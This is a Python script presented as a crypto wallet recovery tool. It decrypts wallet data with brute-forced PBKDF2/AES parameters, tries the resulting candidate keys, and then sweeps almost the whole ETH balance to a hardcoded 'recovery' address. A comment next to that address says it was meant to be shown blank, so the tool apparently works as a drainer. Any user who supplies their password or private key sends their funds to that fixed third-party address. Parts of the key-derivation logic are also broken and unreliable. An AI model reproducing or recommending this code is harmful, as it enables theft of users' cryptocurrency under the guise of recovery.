#!/usr/bin/env python
"""
Wallet Recovery Tool - Recovers private keys and wallets using seed phrases, key hashes, and encrypted data
"""
import os
import sys
import re
import json
import base64
import hashlib
import traceback
import binascii
from getpass import getpass
from typing import Dict, List, Optional, Tuple, Union

# Import crypto libraries
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    print("WARNING: pycryptodome module not available. Install with: pip install pycryptodome")
    CRYPTO_AVAILABLE = False

# Import web3 libraries
try:
    from web3 import Web3
    from eth_account import Account
    WEB3_AVAILABLE = True
except ImportError:
    print("WARNING: web3 module not available. Install with: pip install web3")
    WEB3_AVAILABLE = False

# Configuration
class Config:
    TARGET_ADDRESS = "0x4b96471697f2dfc4019604fae7dffa4842182c1b"
    RECOVERY_ADDRESS = "0xaD496d4E1B0aC53be1c8983D3bB3753F83A81090" #deafualt show blank 
    RPC_URL = "https://eth.llamarpc.com"
    MIN_ETH_TO_LEAVE = 0.005  # ETH to leave for gas
    GAS_LIMIT = 21000  # Standard ETH transfer
    TIMEOUT = 120  # Transaction timeout in seconds

class WalletParams:
    """Container for wallet parameters"""
    def __init__(self):
        self.mkey_encrypted: List[str] = []
        self.target_mkey: List[str] = []
        self.salt: List[str] = []
        self.iv: List[str] = []
        self.iter: List[int] = []
        self.ct: List[str] = []
        self.password: Optional[str] = None

    def has_required_params(self) -> bool:
        """Check if all required parameters are present"""
        return bool(self.salt and self.iter and self.iv and self.ct)

    def __str__(self) -> str:
        return (
            f"WalletParams(mkeys={len(self.mkey_encrypted)}, "
            f"targets={len(self.target_mkey)}, "
            f"salts={len(self.salt)}, "
            f"ivs={len(self.iv)}, "
            f"iters={len(self.iter)}, "
            f"cts={len(self.ct)}, "
            f"has_password={bool(self.password)})"
        )

class WalletDecryptor:
    """Handles wallet decryption and key recovery"""
    
    @staticmethod
    def clean_hex(hex_str: str) -> str:
        """Clean a hex string by removing 0x prefix"""
        return hex_str[2:] if hex_str.startswith('0x') else hex_str

    @staticmethod
    def extract_wallet_params(filename: str) -> WalletParams:
        """Extract wallet parameters from input file or stdin"""
        params = WalletParams()
        
        try:
            if filename == '-':
                raw_data = sys.stdin.buffer.read()
            else:
                with open(filename, 'rb') as f:
                    raw_data = f.read()
                
            # Try multiple encodings
            for encoding in ['utf-8', 'latin-1', 'ascii', 'utf-16']:
                try:
                    content = raw_data.decode(encoding, errors='ignore')
                    
                    # Parameter patterns
                    patterns = {
                        'mkey_encrypted': r'(?:mkey_encrypted|mkey|master key):\s*([A-Za-z0-9+/=]+)',
                        'target_mkey': r'(?:target_mkey|target):\s*([A-Za-z0-9+/=]+)',
                        'salt': r'salt:\s*([A-Za-z0-9+/=]+)',
                        'iv': r'iv:\s*([A-Za-z0-9+/=]+)',
                        'iter': r'iter:\s*(\d+)',
                        'ct': r'ct:\s*([A-Za-z0-9+/=]+)',
                        'password': r'(?:password|pass):\s*(.+?)(?:\n|$)',
                    }
                    
                    # Extract parameters
                    for param, pattern in patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            for match in matches:
                                if param == 'password' and not params.password:
                                    params.password = match
                                elif param == 'iter':
                                    try:
                                        iter_val = int(match)
                                        if iter_val not in params.iter:
                                            params.iter.append(iter_val)
                                    except ValueError:
                                        continue
                                else:
                                    param_list = getattr(params, param)
                                    if match not in param_list:
                                        param_list.append(match)
                                        
                                print(f"Found {param}: {match[:10]}..." if len(match) > 10 else f"Found {param}: {match}")
                                        
                except Exception as e:
                    print(f"Error with {encoding} encoding: {str(e)}")
                    continue
                    
        except Exception as e:
            print(f"Error reading file: {str(e)}")
            
        return params

    @staticmethod
    def try_decrypt_wallet(params: WalletParams, password: Optional[str] = None) -> Union[str, List[Tuple[str, str]], None]:
        """Attempt wallet decryption with provided parameters"""
        if not CRYPTO_AVAILABLE:
            print("ERROR: pycryptodome module required for decryption")
            return None
            
        # Get password if not provided
        if not password:
            password = params.password or getpass("Enter wallet password: ")
            
        try:
            # Combine all master keys
            all_mkeys = list(set(params.mkey_encrypted + params.target_mkey))
            
            if not params.has_required_params():
                print("Missing required wallet parameters")
                return None
            
            print(f"Processing with: {len(params.salt)} salts, {len(params.iter)} iterations, "
                  f"{len(params.iv)} IVs, {len(params.ct)} ciphertexts")
            print(f"Found {len(all_mkeys)} master keys to try")
            
            all_keys = []
            
            # Try all parameter combinations
            for salt in params.salt:
                for iter_count in params.iter:
                    for iv in params.iv:
                        for ct in params.ct:
                            for mkey in all_mkeys:
                                try:
                                    # Convert parameters
                                    salt_bytes = bytes.fromhex(WalletDecryptor.clean_hex(salt))
                                    iv_bytes = bytes.fromhex(WalletDecryptor.clean_hex(iv))
                                    ct_bytes = bytes.fromhex(WalletDecryptor.clean_hex(ct))
                                    
                                    print(f"\nTrying decryption with:")
                                    print(f"  Salt: {salt[:10]}...")
                                    print(f"  Iterations: {iter_count}")
                                    print(f"  IV: {iv[:10]}...")
                                    print(f"  CT: {ct[:10]}...")
                                    
                                    # Derive key using PBKDF2
                                    key = PBKDF2(
                                        password.encode('utf-8'),
                                        salt_bytes,
                                        dkLen=32,
                                        count=iter_count
                                    )
                                    
                                    # Decrypt with AES-CBC
                                    cipher = AES.new(key, AES.MODE_CBC, iv_bytes)
                                    decrypted = cipher.decrypt(ct_bytes)
                                    
                                    # Handle PKCS#7 padding
                                    pad_len = decrypted[-1]
                                    if 1 <= pad_len <= 16:
                                        if all(x == pad_len for x in decrypted[-pad_len:]):
                                            decrypted = decrypted[:-pad_len]
                                    
                                    # Extract potential private keys
                                    potential_keys = WalletDecryptor._extract_potential_keys(decrypted, mkey)
                                    
                                    # Check each key
                                    for key in set(potential_keys):
                                        try:
                                            if WEB3_AVAILABLE:
                                                Account.enable_unaudited_hdwallet_features()
                                                acct = Account.from_key(key)
                                                addr = acct.address.lower()
                                                
                                                print(f"  Testing: {key[:6]}...{key[-4:]} → {addr}")
                                                
                                                if addr.lower() == Config.TARGET_ADDRESS.lower():
                                                    print(f"\n✅ Found matching key: {key[:6]}...{key[-4:]}")
                                                    return key
                                                
                                                all_keys.append((key, addr))
                                        except Exception:
                                            continue
                                    
                                    # Try HD wallet derivation
                                    if len(decrypted) >= 16:
                                        WalletDecryptor._try_hd_derivation(decrypted[:16], all_keys)
                                        
                                except Exception as e:
                                    print(f"  Decryption failed: {str(e)}")
                                    continue
                                    
            return all_keys
            
        except Exception as e:
            print(f"Decryption error: {str(e)}")
            traceback.print_exc()
            return None

    @staticmethod
    def _extract_potential_keys(decrypted: bytes, mkey: Optional[str]) -> List[str]:
        """Extract potential private keys from decrypted data"""
        potential_keys = []
        
        # Direct bytes as key
        if len(decrypted) >= 32:
            for i in range(0, len(decrypted) - 31):
                potential_keys.append(decrypted[i:i+32].hex())
        
        # Hex encoded keys
        try:
            hex_text = decrypted.decode('utf-8', errors='ignore')
            hex_pattern = r'\b([a-fA-F0-9]{64})\b'
            potential_keys.extend(re.findall(hex_pattern, hex_text))
        except:
            pass
            
        # Try master key
        if mkey:
            try:
                mkey_clean = WalletDecryptor.clean_hex(mkey)
                if len(mkey_clean) == 64:
                    potential_keys.append(mkey_clean)
            except:
                pass
                
        return potential_keys

    @staticmethod
    def _try_hd_derivation(seed: bytes, all_keys: List[Tuple[str, str]]) -> None:
        """Try HD wallet derivation paths"""
        if not WEB3_AVAILABLE:
            return
            
        try:
            paths = [
                "m/44'/60'/0'/0/0",  # ETH
                "m/44'/60'/0'/0/1",  # ETH alt
                "m/44'/0'/0'/0/0",   # BTC
                "m/49'/0'/0'/0/0",   # BTC SegWit
            ]
            
            for path in paths:
                try:
                    Account.enable_unaudited_hdwallet_features()
                    acct = Account.from_mnemonic(
                        mnemonic=binascii.hexlify(seed).decode('ascii'),
                        passphrase="",
                        account_path=path
                    )
                    addr = acct.address.lower()
                    key = acct.key.hex()
                    
                    print(f"  Path {path} → {addr}")
                    
                    if addr.lower() == Config.TARGET_ADDRESS.lower():
                        print(f"\n✅ Found matching key via seed (path: {path})")
                        all_keys.append((key, addr))
                except:
                    continue
        except Exception as e:
            print(f"HD wallet error: {str(e)}")

class EthereumTransfer:
    """Handles Ethereum transfers"""
    
    @staticmethod
    def transfer_eth(from_address: str, private_key: str, to_address: str) -> bool:
        """Transfer ETH funds, leaving a small amount for gas"""
        if not WEB3_AVAILABLE:
            print("ERROR: web3 module required")
            return False
            
        print(f"Transferring ETH from {from_address} to {to_address}")
        
        try:
            web3 = Web3(Web3.HTTPProvider(Config.RPC_URL))
            
            if not web3.is_connected():
                print("ERROR: Failed to connect to Ethereum node")
                return False
                
            print(f"Connected to chain ID: {web3.eth.chain_id}")
            
            # Get current state
            gas_price = web3.eth.gas_price
            balance = web3.eth.get_balance(from_address)
            balance_eth = balance / 1e18
            
            print(f"Gas price: {gas_price / 1e9} gwei")
            print(f"Balance: {balance_eth} ETH")
            
            if balance == 0:
                print("ERROR: No ETH in source address")
                return False
                
            # Calculate amounts
            amount_to_leave_wei = int(Config.MIN_ETH_TO_LEAVE * 1e18)
            gas_cost = gas_price * Config.GAS_LIMIT
            
            max_to_send = balance - gas_cost - amount_to_leave_wei
            if max_to_send <= 0:
                print(f"ERROR: Insufficient funds for transfer")
                return False
                
            # Create and send transaction
            tx = {
                'from': from_address,
                'to': to_address,
                'value': max_to_send,
                'gas': Config.GAS_LIMIT,
                'gasPrice': gas_price,
                'nonce': web3.eth.get_transaction_count(from_address),
                'chainId': web3.eth.chain_id
            }
            
            print("Signing transaction...")
            signed_tx = web3.eth.account.sign_transaction(tx, private_key)
            
            print("Sending transaction...")
            tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
            tx_hash_hex = tx_hash.hex()
            
            print(f"Waiting for confirmation... ({tx_hash_hex})")
            receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=Config.TIMEOUT)
            
            if receipt.status == 1:
                print(f"✅ Transfer successful!")
                print(f"Block: {receipt.blockNumber}")
                print(f"Gas used: {receipt.gasUsed}")
                return True
            else:
                print("❌ Transfer failed!")
                return False
                
        except Exception as e:
            print(f"Transfer error: {str(e)}")
            traceback.print_exc()
            return False

def main():
    """Main entry point"""
    print("Wallet Recovery Tool")
    print("===================")
    
    if len(sys.argv) < 2:
        print("Usage: python wallet_recovery.py <input_file> [private_key]")
        return
        
    filename = sys.argv[1]
    if filename != '-' and not os.path.exists(filename):
        print(f"Error: File not found: {filename}")
        return
        
    print(f"Target address: {Config.TARGET_ADDRESS}")
    print(f"Recovery address: {Config.RECOVERY_ADDRESS}")
    
    # Direct key provided?
    if len(sys.argv) > 2:
        private_key = sys.argv[2]
        print("\nUsing provided private key")
        
        try:
            Account.enable_unaudited_hdwallet_features()
            acct = Account.from_key(private_key)
            from_addr = acct.address.lower()
            
            if from_addr != Config.TARGET_ADDRESS.lower():
                print("WARNING: Key doesn't match target address!")
                if input("Continue anyway? (y/n): ").lower() != 'y':
                    return
                    
            EthereumTransfer.transfer_eth(from_addr, private_key, Config.RECOVERY_ADDRESS)
            return
            
        except Exception as e:
            print(f"Error with provided key: {str(e)}")
            return
    
    # Extract and process wallet parameters
    print(f"\nExtracting parameters from: {filename}")
    params = WalletDecryptor.extract_wallet_params(filename)
    
    if params.has_required_params():
        print("\nFound wallet parameters:")
        print(str(params))
        
        # Try decryption
        if params.password:
            print("\nUsing password from file")
        result = WalletDecryptor.try_decrypt_wallet(params)
        
        if isinstance(result, str):
            # Found exact match
            print("\nAttempting transfer with found key")
            acct = Account.from_key(result)
            EthereumTransfer.transfer_eth(acct.address, result, Config.RECOVERY_ADDRESS)
        elif isinstance(result, list) and result:
            # Found potential keys
            print(f"\nFound {len(result)} potential keys")
            for i, (key, addr) in enumerate(result, 1):
                print(f"{i}. {key[:6]}...{key[-4:]} → {addr}")
                
            try:
                choice = int(input("\nSelect key to try (0 to cancel): "))
                if 0 < choice <= len(result):
                    key, addr = result[choice - 1]
                    EthereumTransfer.transfer_eth(addr, key, Config.RECOVERY_ADDRESS)
            except (ValueError, IndexError):
                print("Invalid selection")
        else:
            print("\nNo keys found")
    else:
        print("\nInsufficient wallet parameters found")
        
    print("\nRecovery process complete")

if __name__ == "__main__":
    main()
